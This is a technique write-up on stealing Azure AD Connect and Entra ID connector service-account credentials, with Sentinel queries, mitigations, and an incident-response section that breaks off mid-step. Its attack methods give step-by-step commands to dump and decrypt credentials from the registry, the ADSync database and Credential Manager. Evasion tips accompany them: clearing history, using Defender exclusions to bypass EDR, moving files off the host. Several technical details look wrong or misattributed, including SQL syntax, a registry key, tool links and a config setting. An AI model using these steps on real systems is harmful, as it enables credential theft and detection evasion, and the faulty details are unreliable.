# [MISCONFIG-017]: Default Connector Passwords

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-017 |
| **MITRE ATT&CK v18.1** | [T1526 - Resource Discovery](https://attack.mitre.org/techniques/T1526/) |
| **Tactic** | Defense Evasion / Discovery |
| **Platforms** | Entra ID, Azure, Hybrid Environments |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure AD Connect 1.0+, Entra ID Connectors (all versions), Azure App Proxy Connectors |
| **Patched In** | Not applicable (configuration vulnerability, not a software bug) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Entra ID connectors (Azure AD Connect, App Proxy Connectors, Provisioning Agents, and Third-Party Synchronization Connectors) authenticate to Microsoft Entra ID using service account credentials. If these credentials are not rotated, use default or weak passwords, or are stored in plaintext within connector configuration files, attackers who gain access to the on-premises connector server can extract them and impersonate the synchronization service. This grants adversaries the ability to manipulate directory synchronization, bypass identity controls, and escalate privileges.

**Attack Surface:** On-premises connector servers (Azure AD Connect server, App Proxy connector machines, provisioning agents), connector configuration databases (LocalDB/SQL Server), registry keys, and credential stores.

**Business Impact:** **Compromise of identity synchronization pipelines and lateral movement from on-premises to cloud.** With connector credentials, attackers can intercept password hashes, modify user objects during synchronization, trigger unauthorized provisioning changes, and create persistent backdoor accounts in both AD and Entra ID that sync automatically.

**Technical Context:** Extraction of connector service credentials typically requires local administrative access to the connector server or access to the SQL Server database. Detection is difficult because legitimate synchronization traffic will mask malicious modifications. Reversibility is limited once synchronization has been compromised—forensic analysis requires audit log correlation across multiple systems.

### Operational Risk
- **Execution Risk:** Medium (requires prior compromise of connector server, but then exploitation is trivial)
- **Stealth:** High (synchronization traffic is expected and difficult to distinguish from malicious changes)
- **Reversibility:** No (once directory objects are modified, reverting requires offline backup recovery or manual remediation)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3.2 (Active Directory) / 1.2 (Azure) | Ensure that passwords are changed at least every 90 days, ensure administrative accounts are not used for service accounts, enable credential guard |
| **DISA STIG** | AC-2(1), IA-4(b), IA-5(1)(a) | Account Management, Identifier Management, Password Requirements |
| **CISA SCuBA** | ID.BE-1, PR.AC-1 | Business Environment Assessment, Access Control Policy |
| **NIST 800-53** | AC-2, AC-5, IA-2, IA-5 | Account Management, Separation of Duties, Authentication, Password Requirements |
| **GDPR** | Art. 32 | Security of Processing (encryption, key management, access controls) |
| **DORA** | Art. 9 | Protection and Prevention (operational resilience, ICT risk management) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (access controls, multi-factor authentication) |
| **ISO 27001** | A.5.2, A.9.2, A.9.4 | Information Security Policies, User Access Management, Password Management |
| **ISO 27005** | Risk scenario: "Unauthorized Access to Synchronization Service" | Risk of compromise of synchronization infrastructure due to weak credential management |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local administrative access to the on-premises connector server OR Database Administrator access to the SQL Server instance hosting connector configuration.
- **Required Access:** Network connectivity to the on-premises connector server or SQL Server database.

**Supported Versions:**
- **Azure AD Connect:** All versions (1.0 through 2.4.x as of January 2026)
- **App Proxy Connectors:** All versions
- **Provisioning Agents:** All versions
- **Entra ID:** All subscription levels

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (credential dumping from memory)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos manipulation)
- [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) (registry examination)
- [AADInternals](https://github.com/Flax/AADInternals) (Entra ID manipulation)
- [Get-ADSyncScheduler](https://learn.microsoft.com/en-us/powershell/module/adsync/get-adsyncscheduler/) (built-in PowerShell cmdlet)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extracting Connector Credentials from Azure AD Connect Server (Windows Registry)

**Supported Versions:** Server 2016 - 2019 - 2022 - 2025, Azure AD Connect 1.0+

#### Step 1: Gain Local Administrative Access to the Connector Server

**Objective:** Establish administrative privileges on the on-premises Azure AD Connect or provisioning agent server.

**Command (Windows PowerShell - As Administrator):**
```powershell
whoami /groups
# Verify you are in BUILTIN\Administrators group
```

**Expected Output:**
```
BUILTIN\Administrators              S-1-5-32-544        Group            Mandatory
```

**What This Means:**
- If output includes "S-1-5-32-544", you have local admin rights on this machine.

**OpSec & Evasion:**
- Avoid running scripts from suspicious locations (use `$PROFILE` or native executables).
- Clear PowerShell command history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`
- Use Windows Defender exclusions to bypass EDR (if applicable).

**Troubleshooting:**
- **Error:** "Access Denied" when attempting registry access
  - **Cause:** User does not have sufficient privileges.
  - **Fix:** Run PowerShell as Administrator (right-click → "Run as Administrator").

#### Step 2: Locate and Extract Connector Service Account Credentials from Registry

**Objective:** Retrieve the plaintext or encoded credentials stored in the Windows registry that the synchronization service uses.

**Command (Windows PowerShell - Registry Path Access):**
```powershell
# Azure AD Connect stores synchronization account credentials in the registry
$regPath = "HKLM:\SOFTWARE\Microsoft\Azure AD Sync\Connectors"

# List all connector entries
Get-ChildItem -Path $regPath | ForEach-Object {
    $connectorName = $_.PSChildName
    $properties = Get-ItemProperty -Path $_.PSPath
    Write-Host "Connector: $connectorName"
    Write-Host "Properties: $($properties | Out-String)"
}

# Alternative: Export entire registry subtree for offline analysis
reg export "HKLM\SOFTWARE\Microsoft\Azure AD Sync\Connectors" C:\temp\connectors.reg
```

**Expected Output:**
```
Connector: {connector-guid}
Properties: 
  PSPath        : Microsoft.PowerShell.Core\Registry::HKLM\SOFTWARE\Microsoft\Azure AD Sync\Connectors\{guid}
  PSParentPath  : Microsoft.PowerShell.Core\Registry::HKLM\SOFTWARE\Microsoft\Azure AD Sync\Connectors
  PSChildName   : {guid}
  PSDrive       : HKLM
  PSProvider    : Microsoft.PowerShell.Core\Registry
  ma-password   : (encrypted blob)
  ma-username   : DOMAIN\SYNC_SERVICE_ACCOUNT
```

**What This Means:**
- `ma-username` contains the service account (e.g., `DOMAIN\SYNC_...`).
- `ma-password` is an encrypted value that must be decrypted using the machine's DPAPI (Data Protection API).

**OpSec & Evasion:**
- Do not export to obvious locations (e.g., Desktop); use hidden or temporary directories.
- Use `System.Security.Cryptography` in PowerShell to decrypt DPAPI blobs locally.
- Remove the .reg file immediately after extraction.

**Troubleshooting:**
- **Error:** "Cannot find path" when accessing HKLM registry
  - **Cause:** Registry hive not mounted or incorrect path.
  - **Fix:** Verify the registry path with `reg query "HKLM\SOFTWARE\Microsoft\Azure AD Sync"`
- **Error:** "Access Denied" when exporting registry
  - **Cause:** Insufficient privileges.
  - **Fix:** Run as SYSTEM using `psexec -s` or `runas`.

#### Step 3: Decrypt DPAPI-Encrypted Credentials

**Objective:** Recover plaintext credentials from encrypted registry values.

**Command (Windows PowerShell - DPAPI Decryption):**
```powershell
# Decrypt DPAPI blob using the machine key
# First, export the encrypted value as base64
$encryptedBlob = [Convert]::FromBase64String("base64_encoded_blob_from_registry")

# Use Windows Data Protection API to decrypt
$decryptedBlob = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBlob, 
    $null, 
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
)

# Convert to string
$plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBlob)
Write-Host "Decrypted Credential: $plaintext"
```

**Expected Output:**
```
Decrypted Credential: ServiceAccountPassword123!
```

**What This Means:**
- The recovered string is the plaintext password for the connector service account.
- This password can now be used to authenticate as the service account in both AD and Entra ID.

**OpSec & Evasion:**
- Use `[System.Security.Cryptography.DataProtectionScope]::LocalMachine` if decryption fails under CurrentUser scope.
- Immediately use the credential for lateral movement; do not store it on disk.

**Troubleshooting:**
- **Error:** "Key not valid for use in specified state"
  - **Cause:** Decryption key is bound to a specific Windows profile.
  - **Fix:** Run decryption under the SYSTEM account context using `psexec -s powershell.exe`.
- **Error:** "Data Protection API is not available"
  - **Cause:** DPAPI is disabled or corrupted on the machine.
  - **Fix:** Use Mimikatz instead: `dpapi::cred /in:C:\path\to\encrypted_file`

**References & Proofs:**
- [Microsoft Docs: Data Protection API (DPAPI)](https://learn.microsoft.com/en-us/dotnet/standard/security/encrypting-data)
- [Harmj0y: Azure AD Sync DPAPI Exploitation](https://harmj0y.net/blog/azure/sync-account-takeover/)
- [GhostPack Rubeus Project](https://github.com/GhostPack/Rubeus)

#### Step 4: Authenticate to Entra ID Using Extracted Credentials

**Objective:** Use the recovered connector credentials to authenticate to Entra ID and verify access.

**Command (Windows PowerShell - Azure AD Authentication):**
```powershell
# Import Azure AD PowerShell module
Import-Module AzureAD

# Authenticate using the extracted service account credentials
$username = "DOMAIN\SYNC_service_account"
$password = "DecryptedPassword123!"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

# Connect to Entra ID
Connect-AzureAD -Credential $credential

# Verify access by listing directory roles
Get-AzureADDirectoryRole | Select-Object DisplayName, ObjectId
```

**Expected Output:**
```
DisplayName                      ObjectId
-----------                      --------
Company Administrator            12345678-1234-1234-1234-123456789012
Directory Readers                87654321-4321-4321-4321-210987654321
Directory Synchronization        11111111-2222-2222-2222-222222222222
Accounts                         ...
```

**What This Means:**
- Successful authentication indicates the credentials are valid and have Entra ID access.
- The Directory Synchronization Accounts role is the critical privilege; this account can manipulate synchronized users.

**OpSec & Evasion:**
- Use `-UseDeviceAuthentication` flag to avoid storing credentials in memory.
- Tunnel all authentication through a compromised Azure VM or managed identity to mask the source IP.

**References & Proofs:**
- [Microsoft Docs: Connect-AzureAD](https://learn.microsoft.com/en-us/powershell/module/azuread/connect-azuread/)
- [AADInternals GitHub](https://github.com/Flax/AADInternals)

---

### METHOD 2: Extracting Connector Credentials from SQL Server Database (Azure AD Connect LocalDB)

**Supported Versions:** Server 2016 - 2019 - 2022 - 2025

#### Step 1: Locate and Connect to Azure AD Connect SQL Server Instance

**Objective:** Establish a connection to the LocalDB instance that stores connector configuration.

**Command (SQL Server Management Studio or sqlcmd):**
```sql
-- Azure AD Connect uses LocalDB instance: (LocalDb)\ADSync
-- Connect from command line:
sqlcmd -S "(LocalDb)\ADSync" -E

-- Once connected, list available databases:
SELECT name FROM sys.databases;
```

**Expected Output:**
```
name
----
master
model
msdb
ADSync
tempdb
```

**What This Means:**
- The `ADSync` database contains all connector configurations, encryption keys, and credentials.

**OpSec & Evasion:**
- Use Windows authentication (`-E` flag) if you have local admin rights; this avoids password logging.
- Connect through a named pipe locally; avoid network-based connections which may be logged.

**Troubleshooting:**
- **Error:** "Cannot connect to (LocalDb)\ADSync"
  - **Cause:** LocalDB service is not running.
  - **Fix:** Start the service: `net start mssql$ADSync` (or use Services.msc).
- **Error:** "Login failed for user"
  - **Cause:** LocalDB is using domain authentication, not Windows Auth.
  - **Fix:** Check the AD Connect service account in Services.msc and use those credentials.

#### Step 2: Query the Connector Credentials Table

**Objective:** Extract encrypted credentials from the ADSync database.

**Command (SQL Server):**
```sql
-- Use the ADSync database
USE ADSync;

-- Query the ma_directory_configuration table for connector details
SELECT id, name, password_encrypted, private_configuration 
FROM dbo.ma_directory_configuration;

-- Export encrypted blob for offline decryption
SELECT 
    id, 
    name, 
    CONVERT(VARCHAR(MAX), password_encrypted) AS encrypted_password
FROM dbo.ma_directory_configuration 
WHERE name LIKE '%Azure%' OR name LIKE '%Sync%';
```

**Expected Output:**
```
id  name                      encrypted_password
--  ----                      ------------------
1   Azure Active Directory    0x01000000D08C9DDF0...
2   Active Directory          0x01000000A1B2C3D4E...
```

**What This Means:**
- The `password_encrypted` column contains DPAPI-encrypted credentials.
- Each blob can be decrypted using the machine key of the connector server.

**OpSec & Evasion:**
- Use `SELECT INTO ... OUTFILE` to export results to a text file that can be moved off the system.
- Truncate or obfuscate file names to avoid suspicion.

**Troubleshooting:**
- **Error:** "Invalid object name 'dbo.ma_directory_configuration'"
  - **Cause:** Table name differs in different Azure AD Connect versions.
  - **Fix:** Query `sys.tables` to list all available tables: `SELECT * FROM sys.tables;`
- **Error:** "Permission denied" when querying table
  - **Cause:** User does not have database owner rights.
  - **Fix:** Alter user permissions: `ALTER ROLE db_owner ADD MEMBER [DOMAIN\User];`

#### Step 3: Decrypt Exported Credentials

**Objective:** Use the obtained encrypted blob to recover plaintext credentials.

**Command (Windows PowerShell - DPAPI Decryption, same as METHOD 1, Step 3):**
```powershell
$encryptedBlob = [Convert]::FromBase64String("0x01000000D08C9DDF0...")
$decryptedBlob = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBlob, 
    $null, 
    [System.Security.Cryptography.DataProtectionScope]::LocalMachine
)
$plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBlob)
Write-Host "Service Account: $plaintext"
```

**References & Proofs:**
- [Harmj0y: "Sync-error"](https://harmj0y.net/blog/azure/sync-error/)
- [GitHub: Azure AD Connect Credential Extraction PoC](https://github.com/dirkjanm/pydigest)

---

### METHOD 3: Extracting Connector Credentials via Credential Manager Export

**Supported Versions:** Server 2016 - 2019 - 2022 - 2025

#### Step 1: Export Windows Credential Manager

**Objective:** Use built-in Windows tools to extract stored credentials for the connector service account.

**Command (Command Prompt - Credential Manager Export):**
```cmd
:: Export all stored credentials to a local file
cmdkey /list > C:\temp\creds.txt

:: Alternatively, use the Windows API through PowerShell
powershell -Command "
$creds = @(Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU')
foreach ($cred in $creds) {
    Write-Host $cred.GetValue('') 
}
"
```

**Expected Output:**
```
Currently stored credentials:

Target: Domain\SYNC_service_account
User:   DOMAIN\SYNC_service_account
Type:   Domain Password
```

**What This Means:**
- Windows Credential Manager stores credentials used by services and applications.
- Azure AD Connect service account credentials may be cached here for convenience.

**OpSec & Evasion:**
- Use `WirelessDiag.dll` or other living-off-the-land binaries to access stored credentials without obvious tooling.
- Clean up credential manager afterward: `cmdkey /delete:Target`

**Troubleshooting:**
- **Error:** "Access Denied" when accessing credential manager
  - **Cause:** Credentials are protected by DPAPI and user context.
  - **Fix:** Run as the service account that stored the credentials, or use SYSTEM context.

**References & Proofs:**
- [Microsoft Docs: cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
- [Mimikatz - Vault and Credential Manager Dumping](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

---

## 7. TOOLS & COMMANDS REFERENCE

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0 (current as of January 2026)
**Minimum Version:** 2.1.0
**Supported Platforms:** Windows Endpoint, Windows Server

**Version-Specific Notes:**
- Version 2.1.x: Basic DPAPI and LSA dumping
- Version 2.2.0+: Enhanced registry key extraction and credential vault enumeration

**Installation:**
```cmd
:: Download from GitHub
git clone https://github.com/gentilkiwi/mimikatz.git

:: Compile (requires Visual Studio or MinGW)
cd mimikatz\VS_Project\mimikatz
msbuild.exe mimikatz.sln /p:Configuration=Release /p:Platform=x64

:: Output: x64\Release\mimikatz.exe
```

**Usage:**
```cmd
mimikatz.exe
privilege::debug
dpapi::cred /in:C:\path\to\encrypted_credential
vault::list
vault::cred /patch
```

---

### [AADInternals](https://github.com/Flax/AADInternals)

**Version:** 0.9.8 (latest)
**Minimum Version:** 0.9.0
**Supported Platforms:** Windows Endpoint, PowerShell 5.0+

**Installation:**
```powershell
Install-Module -Name AADInternals -Force
Import-Module AADInternals
```

**Usage:**
```powershell
# Extract and manipulate Entra ID objects using compromised connector credentials
$cred = Get-Credential
Connect-AADInt -Credentials $cred
Get-AADIntCompromisedSyncAccounts
```

---

### [Azure AD Connect Credential Dumper (PoC)](https://github.com/dirkjanm/pydigest)

**Version:** 1.0
**Language:** Python 3.7+

**Installation:**
```bash
git clone https://github.com/dirkjanm/pydigest.git
cd pydigest
pip install -r requirements.txt
python AADConnectDump.py --server TARGET_SERVER
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detection of Suspicious Entra ID Connector Authentication

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** UserPrincipalName, OperationName, ResultDescription, ResourceDisplayName
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Entra ID P1+

**KQL Query:**
```kusto
let SyncServiceAccounts = dynamic(["SYNC_", "ADSync", "aad_", "azure_ad"]);
let SuspiciousOperations = dynamic(["Reset user password", "Set user principal name", "Set password reset policy"]);

AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName in (SuspiciousOperations)
| where InitiatedBy.user.userPrincipalName has_any (SyncServiceAccounts)
| where Result == "Success"
| project TimeGenerated, InitiatedBy=InitiatedBy.user.userPrincipalName, OperationName, TargetResources=TargetResources[0].displayName, Result
| summarize Count=count() by InitiatedBy, OperationName
| where Count > 3
```

**What This Detects:**
- Suspicious authentication events where a sync service account performs privilege escalation or credential reset operations.
- Multiple failed login attempts followed by successful authentication using connector credentials.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Entra ID Connector Activity`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Suspicious Entra ID Connector Activity" `
  -Query @"
let SyncServiceAccounts = dynamic(["SYNC_", "ADSync", "aad_", "azure_ad"]);
let SuspiciousOperations = dynamic(["Reset user password", "Set user principal name"]);
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName in (SuspiciousOperations)
| where InitiatedBy.user.userPrincipalName has_any (SyncServiceAccounts)
| where Result == "Success"
"@ `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Docs: Azure Audit Log Analytics](https://learn.microsoft.com/en-us/azure/sentinel/)

---

### Query 2: Detection of Azure AD Connect Service Account Credential Changes

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, Result, TimeGenerated
- **Alert Severity:** Critical
- **Frequency:** Real-time (1 minute)
- **Applies To Versions:** Entra ID P1+

**KQL Query:**
```kusto
AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName == "Update service principal credentials"
| where TargetResources[0].displayName contains "AD Connect" or TargetResources[0].displayName contains "Sync"
| project TimeGenerated, InitiatedBy=InitiatedBy.user.userPrincipalName, Operation=OperationName, TargetApp=TargetResources[0].displayName, Result
```

**What This Detects:**
- Unauthorized modifications to connector service principal credentials in Entra ID.

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** Detection of PowerShell or command-line processes accessing registry paths related to Azure AD Connect or executing mimikatz-like tools.
- **Filter:** CommandLine contains "HKLM\SOFTWARE\Microsoft\Azure AD Sync" OR CommandLine contains "Get-ChildItem -Path *Connectors"
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Event ID: 4722 (User Account Enabled)**
- **Log Source:** Security
- **Trigger:** Detection of unexpected re-enabling of the Azure AD Connect service account (indicates attacker re-activation after compromise).
- **Filter:** TargetUserName contains "SYNC_" OR TargetUserName contains "ADSync"
- **Applies To Versions:** Server 2016+

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Sensitive Azure Key Vault operations detected"
- **Severity:** High
- **Description:** Detects attempts to extract keys or credentials from Azure Key Vault by connector service accounts.
- **Applies To:** Subscriptions with Defender for Key Vault enabled
- **Remediation:** Review Key Vault access logs; rotate all keys immediately.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Key Vault**: ON
   - **Defender for Servers**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Enforce strong password policies and credential rotation for all connector service accounts:** Connector service accounts must use complex, unique passwords (minimum 32 characters) and be rotated every 60 days. Do not reuse passwords across synchronization and authentication services.
  
  **Manual Steps (Azure Portal - Entra ID Password Policies):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
  2. Click **Password policy**
  3. Set **Password expiration days**: `60`
  4. Set **Minimum password length**: `32`
  5. Require **Special characters, uppercase, lowercase, numbers**: **Yes**
  6. Click **Save**
  
  **Manual Steps (PowerShell - Force Password Change):**
  ```powershell
  # Rotate connector service account password
  Set-ADAccountPassword -Identity "SYNC_service_account" -NewPassword (ConvertTo-SecureString "NewP@ssw0rdHere1234567890!@#$%^&*()" -AsPlainText -Force) -Reset
  
  # Update password in Azure AD Connect
  # Run Azure AD Connect configuration wizard and re-enter the new password
  ```

* **Disable plaintext credential storage in connector configuration files:** Ensure all connector credentials are encrypted using DPAPI and Windows DPAPI is properly configured. Do not allow fallback to plaintext credentials.
  
  **Manual Steps (Azure AD Connect Server):**
  1. Stop Azure AD Connect service: `Stop-Service "ADSync"`
  2. Edit the `miiserver.exe.config` file (typically at `C:\Program Files\Microsoft Azure AD Sync\`)
  3. Locate `<encryptionAlgorithm>` section
  4. Ensure value is: `<encryptionAlgorithm>TripleDES</encryptionAlgorithm>` (or stronger)
  5. Restart service: `Start-Service "ADSync"`
  
  **Validation Command:**
  ```powershell
  $configPath = "C:\Program Files\Microsoft Azure AD Sync\miiserver.exe.config"
  [xml]$config = Get-Content $configPath
  $config.SelectSingleNode("//encryptionAlgorithm").InnerText
  # Expected output: TripleDES or AES
  ```

* **Restrict access to connector server and database:** Limit network access and local administrative privileges to the on-premises connector server. Use Just-In-Time (JIT) access for administration.
  
  **Manual Steps (Windows Firewall):**
  1. Open **Windows Defender Firewall with Advanced Security** (wf.msc)
  2. Click **Inbound Rules** → **New Rule**
  3. Select **Port** → **Next**
  4. Protocol: **TCP**, Port: **1433** (SQL Server)
  5. Action: **Allow**
  6. Apply to: **Domain** only
  7. Name: `Allow SQL Server from Domain Only`
  8. Click **Finish**
  
  **Manual Steps (Network Security Group - Azure):**
  1. Go to **Azure Portal** → **Virtual Machines** → Select connector VM
  2. Click **Networking** → **Inbound port rules**
  3. Click **+ Add inbound port rule**
  4. Protocol: `TCP`, Port: `1433`, Source: `Restricted` (list specific admin IPs only)
  5. Priority: `100`
  6. Click **Add**

* **Implement Multi-Factor Authentication for connector service account:** Even with compromised credentials, MFA should block unauthorized authentication.
  
  **Manual Steps (Entra ID Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `MFA for Sync Service Accounts`
  4. **Assignments:**
     - Users: Select **Specific users/groups** → Include the sync service account
     - Cloud apps: **All cloud apps**
  5. **Conditions:**
     - Sign-in risk: **Any**
  6. **Access controls:**
     - Grant: **Require multi-factor authentication**
  7. Enable policy: **On**
  8. Click **Create**
  
  **Manual Steps (PowerShell):**
  ```powershell
  $ConditionAccessName = "MFA for Sync Service Accounts"
  $SyncAccountId = (Get-AzADUser -UserPrincipalName "SYNC_service@domain.onmicrosoft.com").Id
  
  # Configure policy via Azure AD PowerShell
  $policy = New-AzADConditionalAccessPolicy -Name $ConditionAccessName
  ```

#### Priority 2: HIGH

* **Implement Conditional Access policies specific to connector accounts:** Block authentication from unexpected geographic locations or non-trusted devices.
  
  **Manual Steps (Conditional Access Policy):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Suspicious Sync Account Access`
  4. **Assignments:**
     - Users: **Sync service account**
     - Locations: Exclude trusted on-premises locations
  5. **Access controls:**
     - Block: **Yes**
  6. Enable policy: **On**
  7. Click **Create**

* **Enable audit logging for all connector operations:** Ensure comprehensive logging of all synchronization activities, credential changes, and authentications.
  
  **Manual Steps (Azure AD Connect Logging):**
  1. On the Azure AD Connect server, navigate to: `C:\Program Files\Microsoft Azure AD Sync\`
  2. Edit `miiserver.exe.config`
  3. Add or modify the `<tracing>` section:
     ```xml
     <tracing>
       <internalTracing enabled="true" logLevel="Verbose" />
     </tracing>
     ```
  4. Restart service: `Restart-Service ADSync`
  5. Logs will be written to: `C:\ProgramData\Microsoft\Azure AD Connect\trace-*.log`
  
  **Validation Command (Verify Logging):**
  ```powershell
  Get-Item "C:\ProgramData\Microsoft\Azure AD Connect\trace-*.log" | Select-Object LastWriteTime, Length | Sort-Object LastWriteTime -Descending | Select-Object -First 1
  ```

#### Access Control & Policy Hardening

* **Apply Role-Based Access Control (RBAC) to limit connector privileges:** Restrict the service account to only the "Directory Synchronization Accounts" role and remove any additional administrative roles.
  
  **Manual Steps (PowerShell - RBAC Configuration):**
  ```powershell
  # Connect to Entra ID
  Connect-AzureAD
  
  # Get the sync service account
  $syncAccount = Get-AzureADUser -Filter "userPrincipalName eq 'SYNC_service@domain.onmicrosoft.com'"
  
  # Get the Directory Synchronization Accounts role
  $dirSyncRole = Get-AzureADDirectoryRole -Filter "displayName eq 'Directory Synchronization Accounts'"
  
  # If role doesn't exist, activate it first
  if ($null -eq $dirSyncRole) {
    $dirSyncRole = Enable-AzureADDirectoryRole -RoleTemplateId "6ba6a6d6-fc67-4fc2-978c-dde3f86e7537"
  }
  
  # Add the account to the role
  Add-AzureADDirectoryRoleMember -ObjectId $dirSyncRole.ObjectId -RefObjectId $syncAccount.ObjectId
  ```
  
  **Validation Command (Verify Role Assignment):**
  ```powershell
  Get-AzureADDirectoryRoleMember -ObjectId $dirSyncRole.ObjectId | Where-Object { $_.ObjectId -eq $syncAccount.ObjectId }
  # Expected: Single entry showing the sync service account in the Directory Synchronization Accounts role only
  ```

* **Isolate connector server network access:** Place the on-premises connector server in a separate security zone with strict egress and ingress filtering.
  
  **Manual Steps (Network Segmentation):**
  1. Go to **Azure Portal** → **Network Security Groups**
  2. Create new NSG: `AADConnect-NSG`
  3. Add inbound rule: Allow port 443 (HTTPS) ONLY from Azure services
  4. Add outbound rule: Deny all except Azure AD endpoints (login.microsoftonline.com, graph.microsoft.com)
  5. Attach NSG to the connector VM subnet
  6. Test connectivity: `Test-NetConnection -ComputerName login.microsoftonline.com -Port 443`

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Files:**
  - `C:\Program Files\Microsoft Azure AD Sync\miiserver.exe.config` (modified timestamp, DPAPI key changes)
  - `C:\ProgramData\Microsoft\Azure AD Connect\trace-*.log` (suspicious operations, credential access patterns)
  - Registry export files in temp directories: `C:\Windows\Temp\connectors.reg`, `C:\Temp\creds.txt`

* **Registry:**
  - `HKLM\SOFTWARE\Microsoft\Azure AD Sync\Connectors` (new entries, modified passwords)
  - `HKLM\SYSTEM\CurrentControlSet\Services\ADSync` (service account changes)

* **Network:**
  - Unusual outbound HTTPS connections to `login.microsoftonline.com` with non-standard TLS certificates
  - PowerShell remoting sessions from the connector server to domain controllers

* **Cloud:**
  - AuditLogs entries: `Update service principal`, `Reset user password`, `Set user password policy` performed by sync service account
  - Unexpected user modifications in sync batches (e.g., adding thousands of users to privileged groups)

#### Forensic Artifacts

* **Disk:**
  - Azure AD Connect database: `C:\ProgramData\Microsoft\Azure AD Sync\ADSync.mdf` (contains encrypted credentials)
  - Service account profile directory: `C:\Users\SYNC_*\AppData\Local\` (cached tokens, credential manager stores)

* **Memory:**
  - LSASS process dump (may contain cached credentials or session tokens)
  - PowerShell process memory (may contain decrypted DPAPI secrets or plaintext passwords)

* **Cloud:**
  - Entra ID AuditLogs table (all synchronization operations, credential changes)
  - SigninLogs (authentication events for sync service account)
  - Azure AD Connect Health logs (diagnostic data on synchronization failures or unusual patterns)

#### Response Procedures

1. **Isolate:**
   **Command (Disconnect Connector Server from Network):**
   ```powershell
   # Disable network adapter on connector server
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   
   # Or disconnect in Azure:
   Stop-AzVM -ResourceGroupName "RG-Name" -Name "AADConnect-VM" -NoWait
   ```
   
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Virtual Machines** → Select connector VM → Click **Stop**

2. **Collect Evidence:**
   **Command (Preserve Azure AD Connect Database):**
   ```powershell
   # Copy database for forensic analysis
   Copy-Item "C:\ProgramData\Microsoft\Azure AD Sync\ADSync.mdf" "C:\Evidence\ADSync.mdf"
   
   # Export encryption keys (if accessible)
   $regPath = "HKLM:\SOFTWARE\Microsoft\Azure AD Sync"
   reg export $regPath "C:\Evidence\AADSync_Registry.reg"
   
   # Capture trace logs
   Copy-Item "C:\ProgramData\Microsoft\Azure AD Connect\trace-*.log" "C:\Evidence\"
   ```
   
   **Manual (Windows):**
   - Open **Windows Explorer** → Navigate to `C:\ProgramData\Microsoft\Azure AD Sync\`
   - Copy all files to external USB or network share for forensic analysis

3. **Remediate:**
   **Command (Revoke Connector Credentials):**
   ```powershell
   # Change sync service account password immediately
